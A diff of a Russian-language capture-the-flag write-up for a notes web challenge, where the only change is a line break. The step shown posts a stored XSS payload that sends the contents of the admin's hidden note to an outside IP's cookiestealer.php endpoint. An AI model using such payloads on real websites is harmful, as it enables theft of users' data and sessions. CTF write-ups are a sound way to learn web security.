@@ -13,5 +13,6 @@ id=1
 5. Смотрим js path к hidden записи админа.
 Передаем  в http://notes.ctf2019.rocks/append параметры 
 append=<script type="text/javascript">document.location='http://89.163.129.121:9999/cookiestealer.php?c='.concat(document.querySelector('body > div:nth-child(2) > div:nth-child(1) > p:nth-child(2)').innerText);</script>
-id=1 и получаем влаг.
+id=1 
+и получаем влаг.
 
